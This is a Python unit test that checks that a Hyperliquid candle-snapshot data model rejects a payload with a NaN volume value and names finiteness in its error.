def test_HyperliquidRawCandleSnapshot_nan_volume() -> None:
    """Test validation fails for NaN in volume field."""
    payload = {
        "t": [1700000000000],
        "o": ["100.0"],
        "h": ["101.0"],
        "l": ["99.0"],
        "c": ["100.5"],
        "v": ["NaN"],
        "s": "ok",
    }
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawCandleSnapshot.model_validate(payload)
    assert "nan" in str(exc_info.value).lower()
    assert "finite" in str(exc_info.value).lower()
